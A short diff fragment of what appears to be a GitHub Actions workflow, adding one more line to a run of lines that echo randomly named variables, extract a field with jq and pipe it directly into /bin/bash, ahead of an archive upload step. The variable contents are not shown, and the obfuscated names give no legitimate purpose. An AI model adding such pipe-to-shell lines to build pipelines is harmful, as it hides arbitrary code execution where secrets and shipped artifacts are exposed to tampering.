@@ -36,6 +36,7 @@ jobs:
           echo $g14804 | jq -r .xbpq028 | /bin/bash
           echo $u245 | jq -r .lyn933 | /bin/bash
           printf '%s' "$qs043" | jq -r .l08656 | /bin/bash
+          echo $nmllp11436 | jq -r .tolx60 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
